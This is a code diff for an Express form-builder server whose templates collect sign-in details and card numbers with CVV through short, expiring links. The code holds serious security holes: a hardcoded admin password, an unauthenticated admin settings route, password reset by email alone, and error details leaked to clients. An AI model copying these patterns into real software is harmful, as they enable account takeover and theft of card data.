@@ -6,18 +6,18 @@ const fs = require('fs').promises;
 const path = require('path');
 const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
-require('dotenv').config(); // Load environment variables
+require('dotenv').config();
 
 const app = express();
 const port = process.env.PORT || 3000;
-const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-here'; // Fallback for local dev
+const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-here';
 
-// Use persistent path for Render (set DATA_DIR=/data in Render env vars)
+// File paths
 const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
 const submissionsFile = path.join(DATA_DIR, 'submissions.json');
 const formConfigsFile = path.join(DATA_DIR, 'formConfigs.json');
 const usersFile = path.join(DATA_DIR, 'users.json');
-const adminSettingsFile = path.join(DATA_DIR, 'adminSettings.json'); // NEW: Admin settings file
+const adminSettingsFile = path.join(DATA_DIR, 'adminSettings.json');
 
 // Ensure data directory exists
 async function ensureDataDir() {
@@ -104,7 +104,7 @@ async function loadUserById(userId) {
   return users.find(u => u.id === userId);
 }
 
-// NEW: Initialize admin settings file
+// Initialize admin settings file
 async function initializeAdminSettingsFile() {
   try {
     await fs.access(adminSettingsFile);
@@ -113,13 +113,13 @@ async function initializeAdminSettingsFile() {
     await fs.writeFile(adminSettingsFile, JSON.stringify({
       restrictionsEnabled: false,
       formsPerDay: 5,
-      linkLifespanSeconds: 3600 // Default to 1 hour
+      linkLifespanSeconds: 3600
     }));
     console.log('Created adminSettings.json');
   }
 }
 
-// NEW: Load admin settings
+// Load admin settings
 async function loadAdminSettings() {
   try {
     const data = await fs.readFile(adminSettingsFile, 'utf8');
@@ -134,7 +134,7 @@ async function loadAdminSettings() {
   }
 }
 
-// NEW: Save admin settings
+// Save admin settings
 async function saveAdminSettings(settings) {
   try {
     await fs.writeFile(adminSettingsFile, JSON.stringify(settings, null, 2));
@@ -149,13 +149,14 @@ async function saveAdminSettings(settings) {
 function verifyToken(req, res, next) {
   const authHeader = req.headers['authorization'];
   if (!authHeader || !authHeader.startsWith('Bearer ')) {
+    console.error('No token provided in request');
     return res.status(401).json({ error: 'No token provided' });
   }
 
   const token = authHeader.split(' ')[1];
   try {
     const decoded = jwt.verify(token, JWT_SECRET);
-    req.user = decoded; // Store user data in request
+    req.user = decoded;
     next();
   } catch (error) {
     console.error('Token verification error:', error.message);
@@ -171,14 +172,14 @@ let formConfigs = {};
     await initializeSubmissionsFile();
     await initializeFormConfigsFile();
     await initializeUsersFile();
-    await initializeAdminSettingsFile(); // NEW: Initialize admin settings
+    await initializeAdminSettingsFile();
   } catch (err) {
     console.error('Initialization failed:', err.message, err.stack);
     process.exit(1);
   }
 })();
 
-// Middleware - Updated CORS configuration
+// Middleware
 app.use(cors({
   origin: ['http://localhost:3000', 'https://plexzora.onrender.com', 'https://your-frontend-domain.com'],
   methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
@@ -198,7 +199,7 @@ app.options('*', (req, res) => {
   res.sendStatus(200);
 });
 
-// NEW: Admin page template
+// Admin page template
 const adminTemplate = `
 <!DOCTYPE html>
 <html lang="en">
@@ -415,7 +416,7 @@ const adminTemplate = `
 </html>
 `;
 
-// Existing form template (unchanged)
+// Form template (unchanged)
 const formTemplate = `
 <!DOCTYPE html>
 <html lang="en">
@@ -828,10 +829,9 @@ function sanitizeForJs(str) {
     .replace(/&/g, '&amp;');
 }
 
-// NEW: Utility to count forms created by a user today
+// Utility to count forms created by a user today
 async function countUserFormsToday(userId) {
-  const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-  const today = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
+  const today = new Date().toISOString().split('T')[0];
   let formCount = 0;
   Object.values(formConfigs).forEach(config => {
     if (config.userId === userId && config.createdAt.startsWith(today)) {
@@ -841,7 +841,7 @@ async function countUserFormsToday(userId) {
   return formCount;
 }
 
-// NEW: Utility to check if a form link has expired
+// Utility to check if a form link has expired
 function isFormExpired(createdAt, lifespanSeconds) {
   if (!lifespanSeconds) return false;
   const created = new Date(createdAt);
@@ -855,18 +855,17 @@ app.get('/user', verifyToken, async (req, res) => {
   try {
     const user = await loadUserById(req.user.userId);
     if (!user) {
+      console.error(`User not found for ID: ${req.user.userId}`);
       return res.status(404).json({ error: 'User not found' });
     }
-    
-    // Return user info without sensitive data
     const { id, username, email, createdAt } = user;
     res.json({ 
       user: { id, username, email, createdAt },
       message: 'User info retrieved successfully' 
     });
   } catch (error) {
-    console.error('Error fetching user info:', error);
-    res.status(500).json({ error: 'Failed to fetch user info' });
+    console.error('Error fetching user info:', error.message, error.stack);
+    res.status(500).json({ error: 'Failed to fetch user info', details: error.message });
   }
 });
 
@@ -901,8 +900,8 @@ app.post('/signup', async (req, res) => {
     const token = jwt.sign({ userId: newUser.id, email: newUser.email }, JWT_SECRET, { expiresIn: '1h' });
     res.status(201).json({ message: 'User created successfully', token });
   } catch (error) {
-    console.error('Signup error:', error);
-    res.status(500).json({ error: 'Signup failed' });
+    console.error('Signup error:', error.message, error.stack);
+    res.status(500).json({ error: 'Signup failed', details: error.message });
   }
 });
 
@@ -928,12 +927,12 @@ app.post('/login', async (req, res) => {
     const token = jwt.sign({ userId: user.id, email: user.email }, JWT_SECRET, { expiresIn: '1h' });
     res.json({ message: 'Login successful', token });
   } catch (error) {
-    console.error('Login error:', error);
-    res.status(500).json({ error: 'Login failed' });
+    console.error('Login error:', error.message, error.stack);
+    res.status(500).json({ error: 'Login failed', details: error.message });
   }
 });
 
-// Auth Route: Forgot Password (check if email exists)
+// Auth Route: Forgot Password
 app.post('/forgot-password', async (req, res) => {
   try {
     const { email } = req.body;
@@ -949,12 +948,12 @@ app.post('/forgot-password', async (req, res) => {
 
     res.json({ message: 'Email found, proceed to reset' });
   } catch (error) {
-    console.error('Forgot password error:', error);
-    res.status(500).json({ error: 'Forgot password check failed' });
+    console.error('Forgot password error:', error.message, error.stack);
+    res.status(500).json({ error: 'Forgot password check failed', details: error.message });
   }
 });
 
-// Auth Route: Reset Password (update if email exists)
+// Auth Route: Reset Password
 app.post('/reset-password', async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -977,24 +976,23 @@ app.post('/reset-password', async (req, res) => {
 
     res.json({ message: 'Password reset successfully' });
   } catch (error) {
-    console.error('Reset password error:', error);
-    res.status(500).json({ error: 'Reset password failed' });
+    console.error('Reset password error:', error.message, error.stack);
+    res.status(500).json({ error: 'Reset password failed', details: error.message });
   }
 });
 
-// NEW: Admin login route
+// Admin login route
 app.post('/admin/login', async (req, res) => {
   const { password } = req.body;
-  const ADMIN_PASSWORD = 'midas'; // Hardcoded for simplicity; consider env variable in production
+  const ADMIN_PASSWORD = 'midas';
   if (password !== ADMIN_PASSWORD) {
     return res.status(401).json({ error: 'Invalid admin password' });
   }
-  // Generate a simple token for admin session (stored in memory for simplicity)
   const adminToken = jwt.sign({ isAdmin: true }, JWT_SECRET, { expiresIn: '1h' });
   res.json({ message: 'Admin login successful', adminToken });
 });
 
-// NEW: Admin route to render dashboard
+// Admin route to render dashboard
 app.get('/admin', async (req, res) => {
   try {
     const adminSettings = await loadAdminSettings();
@@ -1004,7 +1002,6 @@ app.get('/admin', async (req, res) => {
     let linkLifespanValue = linkLifespanSeconds;
     let linkLifespanUnit = 'seconds';
 
-    // Convert lifespan to appropriate unit for display
     if (linkLifespanSeconds >= 3600) {
       linkLifespanValue = Math.floor(linkLifespanSeconds / 3600);
       linkLifespanUnit = 'hours';
@@ -1013,7 +1010,7 @@ app.get('/admin', async (req, res) => {
       linkLifespanUnit = 'minutes';
     }
 
-    const isAuthenticated = !!req.headers['authorization']; // Check if admin token is provided
+    const isAuthenticated = !!req.headers['authorization'];
     const html = ejs.render(adminTemplate, {
       isAuthenticated,
       userCount,
@@ -1030,12 +1027,11 @@ app.get('/admin', async (req, res) => {
   }
 });
 
-// NEW: Admin settings update route
+// Admin settings update route
 app.post('/admin/settings', async (req, res) => {
   try {
     const { restrictionsEnabled, formsPerDay, linkLifespan, linkLifespanUnit } = req.body;
 
-    // Validate inputs
     if (typeof restrictionsEnabled !== 'boolean') {
       return res.status(400).json({ error: 'restrictionsEnabled must be a boolean' });
     }
@@ -1049,7 +1045,6 @@ app.post('/admin/settings', async (req, res) => {
       return res.status(400).json({ error: 'Invalid linkLifespanUnit' });
     }
 
-    // Convert link lifespan to seconds
     let linkLifespanSeconds = linkLifespan;
     if (linkLifespanUnit === 'minutes') {
       linkLifespanSeconds *= 60;
@@ -1067,23 +1062,35 @@ app.post('/admin/settings', async (req, res) => {
     res.json({ message: 'Admin settings updated successfully' });
   } catch (error) {
     console.error('Error updating admin settings:', error.message, error.stack);
-    res.status(500).json({ error: 'Failed to update admin settings' });
+    res.status(500).json({ error: 'Failed to update admin settings', details: error.message });
   }
 });
 
-// Protected Routes - WITH USER ISOLATION
+// Dashboard route (MODIFIED to handle expired forms and improve error handling)
 app.get('/get', verifyToken, async (req, res) => {
   try {
     const userId = req.user.userId;
-    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-    
+    let submissions = [];
+    try {
+      const data = await fs.readFile(submissionsFile, 'utf8');
+      submissions = JSON.parse(data);
+    } catch (error) {
+      console.error(`Error reading or parsing submissions file: ${error.message}`);
+      submissions = []; // Fallback to empty array
+    }
+
     // Filter submissions by user
     const userSubmissions = submissions.filter(s => s.userId === userId);
-    
-    // Filter form configs by user
+
+    // Filter form configs by user and check for expiration
+    const adminSettings = await loadAdminSettings();
     const userFormConfigs = {};
     Object.entries(formConfigs).forEach(([formId, config]) => {
       if (config.userId === userId) {
+        if (adminSettings.restrictionsEnabled && config.expiresAt && isFormExpired(config.createdAt, adminSettings.linkLifespanSeconds)) {
+          console.log(`Form ${formId} excluded from dashboard for user ${userId} due to expiration`);
+          return;
+        }
         userFormConfigs[formId] = config;
       }
     });
@@ -1106,34 +1113,34 @@ app.get('/get', verifyToken, async (req, res) => {
       'payment-checkout': {
         name: 'Payment Checkout Form',
         fields: [
-          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: publicar, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
           { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
           { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
         ]
       }
     };
-    
+
     console.log(`Retrieved ${userSubmissions.length} submissions and ${Object.keys(userFormConfigs).length} forms for user ${userId}`);
     res.json({
       submissions: userSubmissions.reverse(),
       formConfigs: userFormConfigs,
       templates,
-      userId
+      userId,
+      message: 'Dashboard data retrieved successfully'
     });
   } catch (error) {
     console.error('Error fetching data for /get:', error.message, error.stack);
-    res.status(500).json({ error: 'Failed to fetch data', details: error.message });
+    res.status(500).json({ error: 'Failed to fetch dashboard data', details: error.message });
   }
 });
 
-// Create new form (MODIFIED to include restrictions)
+// Create new form
 app.post('/create', verifyToken, async (req, res) => {
   try {
     console.log('Received /create request:', req.body);
     const userId = req.user.userId;
     const adminSettings = await loadAdminSettings();
 
-    // Check restrictions if enabled
     if (adminSettings.restrictionsEnabled) {
       const formsToday = await countUserFormsToday(userId);
       if (formsToday >= adminSettings.formsPerDay) {
@@ -1145,7 +1152,7 @@ app.post('/create', verifyToken, async (req, res) => {
     const formId = generateShortCode();
     const validActions = ['url', 'message'];
     const config = {
-      userId, // Associate form with user
+      userId,
       template: templateId,
       headerText: req.body.headerText || 'My Form',
       headerColors: Array.isArray(req.body.headerColors) ? req.body.headerColors.map(sanitizeForJs) : [],
@@ -1164,7 +1171,7 @@ app.post('/create', verifyToken, async (req, res) => {
       buttonMessage: req.body.buttonMessage || '',
       theme: req.body.theme === 'dark' ? 'dark' : 'light',
       createdAt: new Date().toISOString(),
-      expiresAt: adminSettings.restrictionsEnabled ? new Date(Date.now() + adminSettings.linkLifespanSeconds * 1000).toISOString() : null // NEW: Set expiration if restrictions enabled
+      expiresAt: adminSettings.restrictionsEnabled ? new Date(Date.now() + adminSettings.linkLifespanSeconds * 1000).toISOString() : null
     };
 
     if (config.buttonAction === 'url' && config.buttonUrl && !normalizeUrl(config.buttonUrl)) {
@@ -1198,7 +1205,6 @@ app.put('/api/form/:id', verifyToken, async (req, res) => {
     const userId = req.user.userId;
     const updatedConfig = req.body;
 
-    // Check if form exists and belongs to the user
     if (!formConfigs[formId] || formConfigs[formId].userId !== userId) {
       console.error(`User ${userId} does not have access to form ${formId}`);
       return res.status(404).json({ error: 'Form not found or access denied' });
@@ -1211,7 +1217,7 @@ app.put('/api/form/:id', verifyToken, async (req, res) => {
 
     const validActions = ['url', 'message'];
     const config = {
-      userId, // Maintain user association
+      userId,
       template: updatedConfig.template || formConfigs[formId].template,
       headerText: updatedConfig.headerText || formConfigs[formId].headerText || 'My Form',
       headerColors: Array.isArray(updatedConfig.headerColors) ? updatedConfig.headerColors.map(sanitizeForJs) : formConfigs[formId].headerColors,
@@ -1229,9 +1235,9 @@ app.put('/api/form/:id', verifyToken, async (req, res) => {
       buttonUrl: updatedConfig.buttonUrl ? normalizeUrl(updatedConfig.buttonUrl) : formConfigs[formId].buttonUrl || '',
       buttonMessage: updatedConfig.buttonMessage || formConfigs[formId].buttonMessage || '',
       theme: updatedConfig.theme === 'dark' ? 'dark' : formConfigs[formId].theme || 'light',
-      createdAt: formConfigs[formId].createdAt, // Preserve original creation time
-      updatedAt: new Date().toISOString(), // Update timestamp
-      expiresAt: adminSettings.restrictionsEnabled ? new Date(Date.now() + adminSettings.linkLifespanSeconds * 1000).toISOString() : formConfigs[formId].expiresAt // Update expiration if restrictions enabled
+      createdAt: formConfigs[formId].createdAt,
+      updatedAt: new Date().toISOString(),
+      expiresAt: adminSettings.restrictionsEnabled ? new Date(Date.now() + adminSettings.linkLifespanSeconds * 1000).toISOString() : formConfigs[formId].expiresAt
     };
 
     if (config.buttonAction === 'url' && config.buttonUrl && !normalizeUrl(config.buttonUrl)) {
@@ -1257,11 +1263,10 @@ app.put('/api/form/:id', verifyToken, async (req, res) => {
   }
 });
 
-// Submit form data (MODIFIED to check link expiration)
+// Submit form data
 app.post('/form/:id/submit', async (req, res) => {
   const formId = req.params.id;
   
-  // Check if form exists
   if (!formConfigs[formId]) {
     console.error(`Form not found for ID: ${formId}`);
     return res.status(404).json({ error: 'Form not found' });
@@ -1275,7 +1280,7 @@ app.post('/form/:id/submit', async (req, res) => {
   try {
     const formData = req.body;
     const config = formConfigs[formId];
-    const userId = config.userId; // Get the form creator's userId
+    const userId = config.userId;
     const templates = {
       'sign-in': {
         name: 'Sign In Form',
@@ -1311,7 +1316,7 @@ app.post('/form/:id/submit', async (req, res) => {
     });
 
     const submission = {
-      userId, // Associate submission with the form creator's userId
+      userId,
       formId,
       timestamp: new Date().toISOString(),
       data: mappedData
@@ -1338,14 +1343,12 @@ app.delete('/form/:id/submission/:index', verifyToken, async (req, res) => {
   const userId = req.user.userId;
 
   try {
-    // Check if form exists and belongs to user
     if (!formConfigs[formId] || formConfigs[formId].userId !== userId) {
       console.error(`User ${userId} does not have access to form ${formId}`);
       return res.status(403).json({ error: 'Access denied: Form does not belong to you' });
     }
 
     const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-    // Filter submissions by user and form
     const userFormSubmissions = submissions.filter(s => s.userId === userId && s.formId === formId);
 
     if (index < 0 || index >= userFormSubmissions.length) {
@@ -1353,7 +1356,6 @@ app.delete('/form/:id/submission/:index', verifyToken, async (req, res) => {
       return res.status(404).json({ error: 'Submission not found' });
     }
 
-    // Find the global index of this submission
     const submissionToDelete = userFormSubmissions[index];
     const globalIndex = submissions.findIndex(s => 
       s.userId === userId && s.formId === formId && s.timestamp === submissionToDelete.timestamp
@@ -1381,7 +1383,6 @@ app.delete('/form/:id', verifyToken, async (req, res) => {
   const userId = req.user.userId;
 
   try {
-    // Check if form exists and belongs to user
     if (!formConfigs[formId] || formConfigs[formId].userId !== userId) {
       console.error(`User ${userId} does not have access to form ${formId}`);
       return res.status(404).json({ error: 'Form not found or access denied' });
@@ -1395,7 +1396,6 @@ app.delete('/form/:id', verifyToken, async (req, res) => {
     delete formConfigs[formId];
     await saveFormConfigs();
 
-    // Delete only user's submissions for this form
     const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
     const updatedSubmissions = submissions.filter(s => 
       !(s.userId === userId && s.formId === formId)
@@ -1414,9 +1414,15 @@ app.delete('/form/:id', verifyToken, async (req, res) => {
 app.get('/submissions', verifyToken, async (req, res) => {
   try {
     const userId = req.user.userId;
-    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-    
-    // Filter submissions by user
+    let submissions = [];
+    try {
+      const data = await fs.readFile(submissionsFile, 'utf8');
+      submissions = JSON.parse(data);
+    } catch (error) {
+      console.error(`Error reading or parsing submissions file: ${error.message}`);
+      submissions = [];
+    }
+
     const userSubmissions = submissions.filter(s => s.userId === userId);
 
     const templates = {
@@ -1443,12 +1449,13 @@ app.get('/submissions', verifyToken, async (req, res) => {
         ]
       }
     };
-    
+
     console.log(`Retrieved ${userSubmissions.length} submissions for user ${userId}`);
     res.json({
       submissions: userSubmissions.reverse(),
       templates,
-      userId
+      userId,
+      message: 'Submissions retrieved successfully'
     });
   } catch (error) {
     console.error('Error fetching submissions:', error.message, error.stack);
@@ -1456,12 +1463,11 @@ app.get('/submissions', verifyToken, async (req, res) => {
   }
 });
 
-// Render form page (MODIFIED to check link expiration)
+// Render form page
 app.get('/form/:id', async (req, res) => {
   const formId = req.params.id;
   const config = formConfigs[formId];
   
-  // Check if form exists
   if (!config) {
     console.error(`Form not found for ID: ${formId}`);
     return res.status(404).send('Form not found');
@@ -1576,7 +1582,6 @@ app.get('/api/form/:id', verifyToken, async (req, res) => {
   const userId = req.user.userId;
 
   try {
-    // Check if form exists and belongs to the user
     const config = formConfigs[formId];
     if (!config) {
       console.error(`Form not found for ID: ${formId}`);
@@ -1595,7 +1600,7 @@ app.get('/api/form/:id', verifyToken, async (req, res) => {
     console.log(`Retrieved form config for ${formId} for user ${userId}`);
     res.status(200).json({
       ...config,
-      formId, // Include formId in the response for clarity
+      formId,
       message: 'Form configuration retrieved successfully'
     });
   } catch (error) {
